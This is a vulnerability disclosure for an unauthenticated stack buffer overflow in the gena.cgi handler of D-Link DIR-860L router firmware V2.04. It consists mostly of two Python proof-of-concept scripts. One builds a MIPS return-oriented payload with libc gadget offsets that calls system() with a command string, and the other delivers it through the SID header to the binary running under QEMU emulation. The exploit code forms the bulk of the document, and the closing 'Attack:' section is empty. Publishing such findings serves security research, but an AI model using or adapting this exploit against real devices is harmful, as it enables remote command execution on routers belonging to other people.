D-Link DIR-860L Routers stackoverflow vulnerability
Product Information:

Brand:  D-Link
Model: D-Link DIR-860L Router
Firmware Version:V2.04
Official Website: D-Link DIR-860L Routers
Firmware Download URL:[https://tsd.dlink.com.tw/ddwn/](https://support.dlink.com/resource/products/dir-860l/REVB/)

Affected Component:

affected source code file :cgibin

affected function : genacgi_main/sub_41A660

Vulnerability Details

Overviem:
The D-Link DIR-860L is built with a Broadcom BCM47081A0 @ 800 MHz chipset, 128 MB of RAM, and 128 MB of flash memory, providing responsive performance.
It easily supports multiple simultaneous streams, downloads, and connected devices. Regardless of the load, it maintains a stable and fast connection.
In version 2.04, due to a flaw in its authentication logic, unauthorized access to /gena.cgi is possible. The SID field lacks length verification, presenting a buffer overflow vulnerability.
An attacker who successfully exploits this vulnerability can send a POST request to /gena.cgi, resulting in an unauthorized crash or execution of arbitrary commands.
Vulnerability description:
The gena.cgi of DIR860L has a stack overflow vulnerability：

Control the REQUEST_METHOD and REQUEST_URI to enter the sub_41A660 function：

In the sub_41A660 function, stack overflow is achieved by manipulating SID as the v2 field of the sprintf function：

```
#python new.py
# -*- coding: utf-8 -*-
import sys
import struct
import base64

def p32(val):
    return struct.pack('<I', val)

def create_payload():
   
    libc_base = 0x7f754000

    cmd =  b'./bin/ls -l;'
    
    #building Payload 
    payload = b'a' * 444
    payload += b'a' * 4                        
    payload += b'a' * 4                       # 452
    payload += p32(libc_base + 0x2A0D0)       # ra (Gadget 1):addiu   $s0, $sp,X.... jalr    $t9     
    payload += b'a' * 0x10                    
    payload += p32(libc_base + 0x56C20 + 0x1F860) # gp
    payload += b'a' * 0x8                     
    payload += p32(libc_base + 0xF99C)        # Gadget3: move    $a0, $s0....jr  $ra;
    payload += b'a' * 0x24                    
    payload += p32(libc_base + 0x56C2C)       # system
    payload += cmd                            # cmd
 
    padding_len = 0xB4 - len(cmd)
    if padding_len < 0:
        print("Error: Command too long!")
        return
        
    payload += b'a' * padding_len              
    payload += p32(libc_base + 0x18210)       # Gadget2：lw      $gp, 0x1C+var_C($sp)....jr  $ra;addiu   $sp, 0x20
    with open('payload_base64.txt', 'w') as f:
        f.write(base64.b64encode(payload).decode())
    print("Base64 payload saved to payload_base64.txt")
if __name__ == '__main__':
    create_payload()
```
```
#run_exploit.py
import os
import base64
import subprocess

# Base64 Payload
with open("payload_base64.txt", "r") as f:
    b64_payload = f.read().strip()

payload = base64.b64decode(b64_payload)

env = os.environ.copy()
env["LD_LIBRARY_PATH"] = "/lib:/usr/lib"
env["REQUEST_METHOD"] = "SUBSCRIBE"
env["REQUEST_URI"] = "/gena.cgi?service=1"
env["QUERY_STRING"] = "service=0"
env["SERVER_ID"] = "uuid"
env["HTTP_TIMEOUT"] = "Second-infinite"

binary_env = {}
for k, v in env.items():
    binary_env[k.encode()] = v.encode()

# Payload
binary_env[b"HTTP_SID"] = payload
# starting QEMU
cmd = ["qemu-mipsel-static", "-L", "./", "-0", "gena.cgi", "./htdocs/cgibin"]

print(f"[*] Sending payload of length {len(payload)}...")
print("[*] GDB server listening on port 1234...")
subprocess.run(cmd, env=binary_env, input=b"") 
```

Attack:
